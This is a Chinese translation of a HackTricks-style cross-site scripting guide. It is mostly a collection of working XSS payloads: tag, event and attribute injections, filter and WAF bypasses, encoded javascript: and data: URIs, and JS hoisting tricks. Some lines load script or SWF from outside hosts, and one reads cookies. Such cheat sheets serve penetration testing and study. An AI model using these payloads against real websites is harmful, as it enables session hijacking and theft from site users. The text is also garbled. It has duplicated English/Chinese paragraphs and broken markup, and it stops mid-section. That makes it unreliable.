# XSS（跨站脚本攻击）

/<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">

**Bug赏金提示**：**注册**Intigriti，一个由黑客创建的高级bug赏金平台！立即加入我们：[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 方法论

1. 检查是否有**任何你可以控制的值**（_参数_，_路径_，_头部_？，_Cookie_？）在HTML中被**反射**或被**JS**代码使用。
2. 找到它被反射/使用的**上下文**。
3. 如果是**反射**的：
   1. 检查你可以使用哪些符号，并根据此准备有效载荷：
      1. 在**原始HTML**中：
         1. 你可以创建新的HTML标签吗？
         2. 你可以使用支持`javascript:`协议的事件或属性吗？
         3. 你可以绕过保护措施吗？
         4. HTML内容是否由任何客户端JS引擎（_AngularJS_，_VueJS_，_Mavo_...）解释？你可以滥用[**客户端模板注入**](../client-side-template-injection-csti.md)。
         5. 如果你无法创建执行JS代码的HTML标签，你可以滥用[**悬挂标记 - HTML无脚本注入**](../dangling-markup-html-scriptless-injection.md)吗？
      2. 在**HTML标签**内部：
         1. 你可以退出到原始HTML上下文吗？
         2. 你可以创建新的事件/属性来执行JS代码吗？
         3. 你被困在的属性是否支持JS执行？
         4. 你可以绕过保护措施吗？
      3. 在**JavaScript代码**内部：
         1. 你可以转义`<script>`标签吗？
         2. 你可以转义字符串并执行不同的JS代码吗？
         3. 你的输入是否在模板文字\`\`中？
         4. 你可以绕过保护措施吗？
      4. 正在**执行的**JavaScript **函数**
         1. 你可以指定要执行的函数名称。例如：`?callback=alert(1)`
   2. 如果是**使用**的：
      1. 你可以利用**DOM XSS**，注意你的输入如何受控制以及你的**受控输入是否被任何漏洞利用**使用。

在处理复杂的XSS时，你可能会发现以下内容很有趣：

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## 反射的值

为了成功利用XSS，你首先需要找到一个**由你控制的值在网页中被反射**。

* **中间反射**：如果你发现参数的值甚至路径的值在网页中被反射，你可以利用**反射型XSS**。
* **存储和反射**：如果你发现一个由你控制的值被保存在服务器中，并且每次访问页面时都被反射，你可以利用**存储型XSS**。
* **通过JS访问**：如果你发现一个由你控制的值被JS使用，你可以利用**DOM XSS**。

## 上下文

在尝试利用XSS时，你首先需要知道**你的输入在哪里被反射**。根据上下文，你将能够以不同的方式执行任意JS代码。

### 原始HTML

如果你的输入在**原始HTML**页面中被反射，你需要滥用一些**HTML标签**以执行JS代码：`<img , <iframe , <svg , <script` ... 这只是你可以使用的众多可能的HTML标签之一。\
此外，请记住[客户端模板注入](../client-side-template-injection-csti.md)。

### 在HTML标签属性内部

如果你的输入在标签的属性值中被反射，你可以尝试：

1. **从属性和标签中逃脱**（然后你将处于原始HTML中），并创建新的HTML标签以滥用：`"><img [...]`
2. 如果你**可以从属性中逃脱但无法从标签中逃脱**（`>`被编码或删除），根据标签的不同，你可以**创建一个事件**来执行JS代码：`" autofocus onfocus=alert(1) x="`
3. 如果你**无法从属性中逃脱**（`"`被编码或删除），那么根据你的值在哪个属性中被反射以及你是否控制所有值或只控制部分值，你将能够滥用它。例如，如果你控制一个像`onclick=`这样的事件，你将能够在点击时执行任意代码。另一个有趣的例子是`href`属性，你可以使用`javascript:`协议来执行任意代码：**`href="javascript:alert(1)"`**
4. 如果你的输入被反射在“**无法利用的标签**”中，你可以尝试使用**`accesskey`**技巧来滥用漏洞（你需要某种社交工程来利用这个）：**`" accesskey="x" onclick="alert(1)" x="`**

### 在JavaScript代码内部

在这种情况下，你的输入被反射在HTML页面的**`<script> [...] </script>`**标签之间，或者在`.js`文件内部，或者在使用**`javascript:`**协议的属性内部：

* 如果反射在**`<script> [...] </script>`**标签之间，即使你的输入在任何引号内，你可以尝试注入`</script>`并从此上下文中逃脱。这是因为**浏览器首先解析HTML标签**，然后解析内容，因此它不会注意到你注入的`</script>`标签在HTML代码中。
* 如果反射在**JS字符串内部**，并且上述技巧不起作用，你需要**退出**字符串，**执行**你的代码，并**重构**JS代码（如果有任何错误，它将不会被执行）：
  * `'-alert(1)-'`
  * `';-alert(1)//`
  * `\';alert(1)//`
* 如果反射在模板文字内部，你可以使用`${ ... }`语法嵌入JS表达式：`` var greetings = `Hello, ${alert(1)}` ``
* **Unicode编码**可以用来编写**有效的javascript代码**：
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
#### Javascript 提升

Javascript 提升是指在使用之后声明函数、变量或类的机会。

因此，如果你遇到了在使用未声明的对象之后注入JS代码的情况，你可以通过声明它来修复语法（这样你的代码就会被执行，而不会抛出错误）：
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
有关JavaScript提升的更多信息，请查看：[https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)

### JavaScript函数

几个网页有端点，**接受函数名称作为参数来执行**。一个常见的例子是：`?callback=callbackFunc`。

一个好的方法来判断用户直接提供的内容是否尝试执行是**修改参数值**（例如改为'Vulnerable'），然后在控制台查看是否有错误，如下所示：

![](<../../.gitbook/assets/image (651) (2).png>)

如果存在漏洞，你可以通过发送值**`?callback=alert(1)`**来**触发警报**。然而，这些端点通常会**验证内容**，只允许字母、数字、点和下划线（**`[\w\._]`**）。

然而，即使有这个限制，仍然可以执行一些操作。这是因为你可以使用这些有效的字符来**访问DOM中的任何元素**：

![](<../../.gitbook/assets/image (662).png>)

一些有用的函数：
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
您还可以尝试直接**触发JavaScript函数**：`obj.sales.delOrders`。

然而，通常执行指定函数的端点是没有太多有趣DOM的端点，**同一源中的其他页面**将具有**更有趣的DOM**以执行更多操作。

因此，为了在**不同的DOM中滥用此漏洞**，开发了**同源方法执行（SOME）**利用：

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

有一些**JS代码**正在**不安全地**使用由攻击者控制的一些数据，如`location.href`。攻击者可以滥用此功能来执行任意JS代码。

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **通用XSS**

这种类型的XSS可以在**任何地方**找到。它们不仅依赖于对Web应用程序的客户端利用，还依赖于**任何****上下文**。这种类型的**任意JavaScript执行**甚至可以被滥用以获得**RCE**，在客户端和服务器上**读取****任意****文件**等等。\
一些**示例**：

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/" %}
[xss-to-rce-electron-desktop-apps](../../network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps/)
{% endcontent-ref %}

## WAF绕过编码图像

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](../../.gitbook/assets/eaubb2ex0aerank.jpg)

## 在原始HTML中注入

当您的输入被反射**在HTML页面中**或者您可以在此上下文中转义和注入HTML代码时，**第一件**需要做的事情是检查是否可以滥用`<`来创建新标签：只需尝试**反射**该**字符**并检查它是否被**HTML编码**或**删除**，或者是否**未经更改地反射**。**只有在最后一种情况下，您才能利用此情况**。\
对于这些情况，还要**记住**[**客户端模板注入（Client Side Template Injection）**](../client-side-template-injection-csti.md)**。**\
_**注意：HTML注释可以使用\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\***** ****`-->`**** ****或 \*\*\*\*****`--!>`**_。

在这种情况下，如果没有使用黑名单/白名单，您可以使用以下有效负载：
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
但是，如果使用了标签/属性的黑名单/白名单，你需要**暴力破解可以创建的标签**。\
一旦你**找到了允许的标签**，你需要**暴力破解找到的有效标签内的属性/事件**，以查看如何攻击上下文。

### 标签/事件的暴力破解

访问[**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)，点击_**复制标签到剪贴板**_。然后，使用Burp Intruder发送所有标签，并检查是否有任何标签被WAF识别为恶意标签。一旦你发现可以使用的标签，你可以使用这些有效标签**暴力破解所有事件**（在同一个网页上点击_**复制事件到剪贴板**_，然后按照之前的步骤进行操作）。

### 自定义标签

如果你没有找到任何有效的HTML标签，你可以尝试**创建一个自定义标签**，并使用`onfocus`属性执行JS代码。在XSS请求中，你需要以`#`结尾的URL，使页面**聚焦在该对象上**并**执行**代码：
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### 黑名单绕过

如果使用了某种黑名单，您可以尝试使用一些愚蠢的技巧来绕过它：
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### 长度绕过（小型XSS）

{% hint style="info" %}
**可以在这里找到更多适用于不同环境的微小XSS负载** [**链接**](https://github.com/terjanq/Tiny-XSS-Payloads) 和 [**链接**](https://tinyxss.terjanq.me)。
{% endhint %}
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
最后一个是使用2个Unicode字符，扩展为5个：telsr\
可以在[这里](https://www.unicode.org/charts/normalization/)找到更多这些字符。\
要检查哪些字符被分解，请查看[这里](https://www.compart.com/en/unicode/U+2121)。

### 点击XSS - 点击劫持

如果为了利用漏洞，您需要**用户点击一个带有预填数据的链接或表单**，您可以尝试[**滥用点击劫持**](../clickjacking.md#xss-clickjacking)（如果页面存在漏洞）。

### 不可能 - 悬挂标记

如果您认为**不可能创建一个带有属性以执行JS代码的HTML标记**，您应该检查[**悬挂标记**](../dangling-markup-html-scriptless-injection.md)，因为您可以在**不执行**JS**代码的情况下**利用漏洞。

## 在HTML标记中注入

### 在标记内部/从属性值中逃逸

如果您在**HTML标记内部**，您可以尝试**逃逸**标记并使用[上一节](./#injecting-inside-raw-html)中提到的一些技术来执行JS代码。\
如果**无法逃离标记**，您可以在标记内部创建新的属性，尝试执行JS代码，例如使用某些有效载荷（_请注意，在此示例中，双引号用于从属性中逃逸，如果您的输入直接反映在标记内部，则不需要它们_）：
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**样式事件**

Style events are a type of Cross-Site Scripting (XSS) attack that allows an attacker to inject malicious code into a website by exploiting vulnerabilities in the way the website handles user input. These events occur when the website's code dynamically updates the style or appearance of elements on the page based on user input.

攻击者可以通过利用网站处理用户输入的漏洞，将恶意代码注入到网站中，从而实现样式事件。这些事件发生在网站的代码根据用户输入动态更新页面元素的样式或外观时。

By injecting malicious code into the website's style attributes, an attacker can manipulate the appearance of the page or execute arbitrary JavaScript code. This can lead to various security risks, such as stealing sensitive user information, performing unauthorized actions on behalf of the user, or defacing the website.

通过将恶意代码注入到网站的样式属性中，攻击者可以操纵页面的外观或执行任意的JavaScript代码。这可能导致各种安全风险，如窃取敏感用户信息、代表用户执行未经授权的操作或篡改网站。

To prevent style events XSS attacks, it is important to properly sanitize and validate user input before using it to update the style of elements on the page. This can be done by implementing input validation and output encoding techniques, such as using a Content Security Policy (CSP) to restrict the types of styles that can be applied to the page.

为了防止样式事件XSS攻击，重要的是在使用用户输入更新页面元素的样式之前，正确地对其进行清理和验证。可以通过实施输入验证和输出编码技术来实现这一点，例如使用内容安全策略（CSP）来限制可以应用于页面的样式类型。

Additionally, keeping software and libraries up to date, using secure coding practices, and regularly conducting security audits can help mitigate the risk of style events XSS attacks.

此外，保持软件和库的最新状态，使用安全编码实践，并定期进行安全审计可以帮助减轻样式事件XSS攻击的风险。
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 在属性中

即使你**无法从属性中逃脱**（`"`被编码或删除），根据你的值被反射到的**哪个属性**，如果你控制所有的值或只是一部分，你将能够滥用它。例如，如果你控制一个像`onclick=`这样的事件，你将能够在点击时执行任意代码。\
另一个有趣的例子是属性`href`，你可以使用`javascript:`协议来执行任意代码：**`href="javascript:alert(1)"`**

**在事件中使用HTML编码/URL编码绕过**

HTML标签属性值中的**HTML编码字符**在运行时被解码。因此，像下面这样的内容将是有效的（payload以粗体显示）：`<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

请注意，**任何类型的HTML编码都是有效的**：
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**请注意，URL编码也可以使用：**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**使用Unicode编码绕过内部事件**

In some cases, web applications may have filters or security mechanisms in place to prevent the execution of certain events, such as `onclick` or `onmouseover`. However, it is possible to bypass these filters by using Unicode encoding.

在某些情况下，Web应用程序可能会设置过滤器或安全机制，以防止执行某些事件，例如`onclick`或`onmouseover`。然而，可以通过使用Unicode编码来绕过这些过滤器。

For example, let's say that the application is filtering the `onclick` event. We can bypass this filter by encoding the event using Unicode characters. The Unicode representation for the letter 'o' is `\u006f`, so we can encode the `onclick` event as `\u006fnclick`.

例如，假设应用程序正在过滤`onclick`事件。我们可以通过使用Unicode字符对事件进行编码来绕过此过滤器。字母'o'的Unicode表示为`\u006f`，因此我们可以将`onclick`事件编码为`\u006fnclick`。

When the application processes this encoded event, it will interpret it as the original `onclick` event and execute the desired code.

当应用程序处理此编码事件时，它将将其解释为原始的`onclick`事件并执行所需的代码。

This technique can be used to bypass event filters and execute arbitrary JavaScript code in vulnerable web applications.

这种技术可用于绕过事件过滤器并在易受攻击的Web应用程序中执行任意JavaScript代码。
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 属性中的特殊协议

在某些地方，您可以使用协议**`javascript:`**或**`data:`**来执行任意的JS代码。有些需要用户交互，而有些则不需要。
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**可以注入这些协议的位置**

**一般来说**，`javascript:`协议可以在接受`href`属性的任何标签中使用，并且可以在大多数接受`src`属性的标签中使用（但不包括`<img>`标签）。
```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**其他混淆技巧**

_**在这种情况下，前一节中的HTML编码和Unicode编码技巧也是有效的，因为您处于属性内部。**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
此外，在这种情况下还有另一个不错的技巧：即使你在`javascript:...`中的输入被URL编码，它在执行之前会被URL解码。因此，如果你需要使用单引号来转义字符串，并且发现它被URL编码了，记住这并不重要，它在执行时会被解释为单引号。
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
请注意，如果您尝试以任何顺序使用`URLencode + HTMLencode`来编码**payload**，它将**无法正常工作**，但您可以在**payload**中**混合使用它们**。

**使用`javascript:`进行十六进制和八进制编码**

您可以在`iframe`的`src`属性中使用**十六进制**和**八进制编码**来声明**执行JS的HTML标签**（至少）。
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### 反向标签劫持

Reverse tab nabbing（反向标签劫持）是一种利用恶意网站攻击用户的一种技术。在这种攻击中，攻击者通过在恶意网站上注入恶意代码，当用户点击链接并在新标签页中打开目标网站时，恶意代码会将目标网站的内容替换为攻击者控制的内容。这种攻击利用了用户对标签页的信任，使得用户无法察觉到他们正在与恶意网站进行交互。

为了防止反向标签劫持攻击，用户应该保持警惕并采取以下预防措施：

- 不要点击来自不可信来源的链接。
- 在打开新标签页之前，仔细检查链接的URL。
- 使用浏览器插件或扩展程序来阻止恶意网站的加载。
- 定期更新浏览器和操作系统以获取最新的安全补丁。

如果您是网站开发人员，您可以采取以下措施来防止反向标签劫持攻击：

- 对用户输入进行严格的验证和过滤，以防止恶意代码注入。
- 在打开新标签页时，使用`rel="noopener"`属性来防止恶意网站访问原始页面的内容。
- 启用内容安全策略（Content Security Policy，CSP），限制网页中可以加载的资源和脚本。

通过采取这些预防措施，用户和网站开发人员可以减少反向标签劫持攻击的风险。
```javascript
<a target="_blank" rel="opener"
```
如果您可以在任意的**`<a href=`**标签中注入任何URL，并且该标签包含**`target="_blank"`**和**`rel="opener"`**属性，请查看**以下页面以利用此行为**：

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### on事件处理程序绕过

首先，请查看此页面（[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)）以获取有用的**"on"事件处理程序**。\
如果存在一些黑名单阻止您创建此事件处理程序，您可以尝试以下绕过方法：
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### 在"无法利用的标签"中的XSS（隐藏输入、链接、规范、元标签）

从[**这里**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **现在可以滥用隐藏输入来进行攻击：**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```
而在**元标签**中：
```html
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
从[**这里**](https://portswigger.net/research/xss-in-hidden-input-fields)：您可以在隐藏属性中执行**XSS负载**，只要您能够**说服****受害者**按下**键盘组合键**。在Firefox Windows/Linux上，组合键是**ALT+SHIFT+X**，在OS X上是**CTRL+ALT+X**。您可以使用访问键属性中的不同键来指定不同的组合键。以下是向量：
```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS负载将类似于：`" accesskey="x" onclick="alert(1)" x="`**

### 黑名单绕过

在本节中已经介绍了使用不同编码的几种技巧。回到之前的部分了解可以在哪里使用：

* **HTML编码（HTML标签）**
* **Unicode编码（可以是有效的JS代码）：**`\u0061lert(1)`
* **URL编码**
* **十六进制和八进制编码**
* **数据编码**

**HTML标签和属性的绕过**

阅读[前一节的黑名单绕过](./#blacklist-bypasses)。

**JavaScript代码的绕过**

阅读[下一节的JavaScript绕过黑名单技术](./#javascript-bypass-blacklists-techniques)。

### CSS-Gadgets

如果你在网页的一个非常小的部分中发现了一个需要某种交互的XSS（也许是页脚中的一个小链接，带有onmouseover元素），你可以尝试**修改元素所占用的空间**，以最大化链接被触发的可能性。

例如，你可以在元素中添加一些样式，如：`position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

但是，如果WAF过滤了style属性，你可以使用CSS Styling Gadgets，所以如果你找到了以下内容

> .test {display:block; color: blue; width: 100%\}

和

> \#someid {top: 0; font-family: Tahoma;}

现在你可以修改我们的链接，并将其变成

> \<a href=”” id=someid class=test onclick=alert() a=””>

这个技巧来自于[https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## 在JavaScript代码中注入

在这种情况下，你的**输入**将被**反射到`.js`文件的JS代码中**，或者在`<script>...</script>`标签之间，或者在可以执行JS代码的HTML事件之间，或者在接受`javascript:`协议的属性之间。

### 转义\<script>标签

如果你的代码被插入到`<script> [...] var input = 'reflected data' [...] </script>`中，你可以很容易地**转义关闭`<script>`**标签：
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
请注意，在这个例子中，我们甚至**没有关闭单引号**，但这并不是必要的，因为**浏览器首先执行HTML解析**来识别页面元素，包括脚本块，然后才执行JavaScript解析来理解和执行嵌入的脚本。

### 在JS代码内部

如果`<>`被过滤了，你仍然可以在输入所在的位置**转义字符串**并**执行任意JS代码**。重要的是要**修复JS语法**，因为如果有任何错误，JS代码将不会被执行：
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
### 模板字面量 \`\`

为了构建字符串，除了单引号和双引号，JS还接受反引号 **` `` `**。这被称为模板字面量，因为它们允许使用 `${ ... }` 语法来嵌入JS表达式。\
因此，如果你发现你的输入被反射到使用反引号的JS字符串中，你可以滥用 `${ ... }` 语法来执行任意的JS代码：

这可以通过以下方式滥用：
```javascript
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```

```````````````javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````
```````````````
### 编码代码执行

In some cases, the application may apply encoding or filtering techniques to user input in order to prevent XSS attacks. However, these techniques can sometimes be bypassed by using encoded payloads that can still be executed by the browser.

在某些情况下，应用程序可能会对用户输入应用编码或过滤技术，以防止XSS攻击。然而，通过使用编码的有效负载，仍然可以绕过这些技术，并在浏览器中执行。

One common technique is to use JavaScript's `eval()` function to execute the payload. By encoding the payload in a way that it will be decoded and executed by `eval()`, it is possible to bypass the filters.

一种常见的技术是使用JavaScript的`eval()`函数来执行有效负载。通过以一种将有效负载解码并由`eval()`执行的方式对有效负载进行编码，可以绕过过滤器。

For example, if the application filters the `<` character, it may be possible to encode the payload using JavaScript's `String.fromCharCode()` function. This function takes a Unicode value as input and returns the corresponding character. By encoding the payload as a series of Unicode values and using `String.fromCharCode()` to decode it, the payload can still be executed.

例如，如果应用程序过滤`<`字符，可以使用JavaScript的`String.fromCharCode()`函数对有效负载进行编码。该函数以Unicode值作为输入，并返回相应的字符。通过将有效负载编码为一系列Unicode值，并使用`String.fromCharCode()`解码它，仍然可以执行有效负载。

Here is an example of an encoded payload that can be executed using `eval()`:

以下是一个可以使用`eval()`执行的编码有效负载的示例：

```javascript
eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))
```

In this example, the payload is the JavaScript code `alert(1)`. Each character of the code is encoded as a Unicode value using `String.fromCharCode()`. When `eval()` is called with the decoded payload, the code is executed and an alert with the number 1 is displayed.

在这个例子中，有效负载是JavaScript代码`alert(1)`。使用`String.fromCharCode()`将代码的每个字符编码为Unicode值。当使用解码的有效负载调用`eval()`时，代码将被执行，并显示一个带有数字1的警报。

By using encoded payloads, it is possible to bypass certain encoding or filtering techniques and execute arbitrary code in the context of the vulnerable application.

通过使用编码的有效负载，可以绕过某些编码或过滤技术，并在易受攻击的应用程序的上下文中执行任意代码。
```markup
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```
### Unicode编码JS执行

This technique involves using Unicode encoding to bypass input validation and execute JavaScript code on a vulnerable web application.

#### Description

Unicode is a character encoding standard that assigns a unique number to each character in various writing systems. By using Unicode encoding, we can represent characters using their corresponding Unicode code points.

In the context of XSS attacks, we can leverage Unicode encoding to bypass input filters that only check for specific characters or patterns. By encoding malicious JavaScript code using Unicode, we can evade detection and successfully execute the code on the target application.

#### Exploitation

To exploit this vulnerability, follow these steps:

1. Identify a vulnerable input field where the application does not properly sanitize or validate user input.
